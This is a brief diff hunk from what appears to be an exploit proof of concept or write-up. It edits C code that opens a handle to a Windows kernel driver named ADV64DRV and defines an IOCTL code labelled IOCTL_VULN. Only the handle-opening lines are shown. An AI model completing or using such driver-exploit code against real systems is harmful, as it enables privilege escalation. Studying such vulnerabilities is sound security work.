@@ -52,7 +52,7 @@ To exploit the vulnerability:
 #define IOCTL_VULN 0x224004
 
 int main() {
-    HANDLE hDevice = CreateFileA("\\\\.\\"dev_symb_link"", //symbolic link name
+    HANDLE hDevice = CreateFileA("\\\\.\\ADV64DRV",
                                  GENERIC_READ | GENERIC_WRITE,
                                  0,
                                  NULL,
